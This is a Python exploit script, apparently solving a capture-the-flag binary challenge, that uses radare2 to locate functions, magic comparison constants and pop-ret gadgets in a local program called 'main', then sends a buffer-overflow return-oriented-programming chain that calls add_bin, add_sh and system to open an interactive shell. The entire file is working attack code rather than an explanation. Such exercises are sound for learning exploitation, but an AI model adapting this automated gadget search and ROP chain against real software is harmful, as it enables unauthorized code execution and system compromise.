import r2pipe
import json
from pwn import *

ADD_BIN = 0x080484b1
ADD_SH = 0x080484fe
EXEC = 0x08048486
SYSTEM = 0x08048340

POP_RET = 0x08048666
POP_POP_RET = 0x0804864a

STRING = 0x0804a060

MAGIC_ARG_BIN = 0xdeadbeef
MAGIC_ARG1_SH = 0xcafebabe
MAGIC_ARG2_SH = 0x0badf00d

APP = "./main"

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis

symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'exec_string':
        EXEC = i['vaddr']
        print("{} find on {}".format(i['name'], hex(EXEC)))
    elif i['type'] == 'FUNC' and i['name'] == 'add_bin':
        ADD_BIN = i['vaddr']
        print("{} find on {}".format(i['name'], hex(ADD_BIN)))
    elif i['type'] == 'FUNC' and i['name'] == 'add_sh':
        ADD_SH = i['vaddr']
        print("{} find on {}".format(i['name'], hex(ADD_SH)))
    elif i['type'] == 'FUNC' and i['name'] == 'imp.system':
        SYSTEM = i['vaddr']
        print("{} find on {}".format(i['name'], hex(SYSTEM)))
    elif i['type'] == 'OBJ' and i['name'] == 'string':
        STRING = i['vaddr']
        print("{} find on {}".format(i['name'], hex(STRING)))

r2.cmd('s {}'.format(ADD_BIN))
func_code = json.loads(r2.cmd('pdfj'))
for opcode in func_code['ops']:
    if opcode['type'] == 'cmp':
        MAGIC_ARG_BIN = opcode['val']
        print("Magic code detected {}".format(hex(MAGIC_ARG_BIN)))
        break

r2.cmd('s {}'.format(ADD_SH))
func_code = json.loads(r2.cmd('pdfj'))
MAGIC_ARG1_SH = MAGIC_ARG2_SH = None
for opcode in func_code['ops']:
    if opcode['type'] == 'cmp':
        if not MAGIC_ARG1_SH:
            MAGIC_ARG1_SH = opcode['val']
            print("Magic code1 detected {}".format(hex(MAGIC_ARG1_SH)))
        elif not MAGIC_ARG2_SH:
            MAGIC_ARG2_SH = opcode['val']
            print("Magic code2 detected {}".format(hex(MAGIC_ARG2_SH)))
            break

POP_POP_RET = None
rops = json.loads(r2.cmd('/Rj'))
for r in rops:
    if (
            not POP_POP_RET and
            len(r['opcodes']) > 3 and
            r['opcodes'][-1]['opcode'] == 'ret' and
            r['opcodes'][-2]['opcode'].startswith('pop') and
            r['opcodes'][-3]['opcode'].startswith('pop')
    ):
        POP_POP_RET = r['opcodes'][-3]['offset']
        print("Rop find on {}".format(hex(POP_POP_RET)))
        POP_RET = r['opcodes'][-2]['offset']
        print("Rop find on {}".format(hex(POP_RET)))
        break

s = process(APP)

# Uncomment for debugging
# s = process("./main")
# gdb.attach(s, 'b*0x08048515')

payload = 'A'*108
payload += 'BBBB' # EBP

# call add_bin
payload += p32(ADD_BIN) # RET
payload += p32(POP_RET) # RET add_bin
# params add_bin
payload += p32(MAGIC_ARG_BIN) # RET add_bin

# call add_sh
payload += p32(ADD_SH)
payload += p32(POP_POP_RET) # RET add_sh
# params ADD_SH
payload += p32(MAGIC_ARG1_SH)
payload += p32(MAGIC_ARG2_SH)

# call exec
payload += p32(SYSTEM)
payload += p32(POP_RET) # RET exec
# params system
payload += p32(STRING)

# call ?
payload += p32(0x41414141)

payload += '\n'
s.send(payload)

s.interactive()
#s.close()